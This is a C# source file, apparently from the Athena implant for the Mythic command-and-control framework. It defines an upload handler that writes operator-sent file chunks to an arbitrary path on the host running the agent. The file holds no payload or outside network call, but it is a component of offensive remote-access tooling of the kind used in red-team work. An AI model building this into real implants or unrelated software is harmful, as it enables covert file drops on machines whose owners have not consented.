using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Newtonsoft.Json;
using PluginBase;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace Athena.Commands
{
    public class UploadHandler
    {
        private ConcurrentDictionary<string, MythicUploadJob> uploadJobs { get; set; }
        
        public UploadHandler()
        {
            uploadJobs = new ConcurrentDictionary<string, MythicUploadJob>();
        }

        public async Task<UploadResponse> StartUploadJob(MythicJob job)
        {
            MythicUploadJob uploadJob = new MythicUploadJob(job);
            Dictionary<string, string> uploadParams = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);

            uploadJob.path = uploadParams["remote_path"];
            uploadJob.file_id = uploadParams["file"];
            uploadJob.task = job.task;
            uploadJob.chunk_num = 1;

            this.uploadJobs.GetOrAdd(job.task.id,uploadJob);

            return new UploadResponse
            {
                task_id = job.task.id,
                upload = new UploadResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            };
        }

        public async Task<bool> ContainsJob(string task_id)
        {
            return uploadJobs.ContainsKey(task_id);
        }

        public async Task<MythicUploadJob> GetUploadJob(string task_id)
        {
            return uploadJobs[task_id];
        }

        /// <summary>
        /// Upload next chunk to the file
        /// </summary>
        public async Task<bool> UploadNextChunk(byte[] bytes, string job_id)
        {
            MythicUploadJob job = uploadJobs[job_id];
            try
            {
                Misc.AppendAllBytes(job.path, bytes);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        public async Task CompleteUploadJob(string task_id)
        {
            this.uploadJobs.Remove(task_id, out _);
        }
    }
}
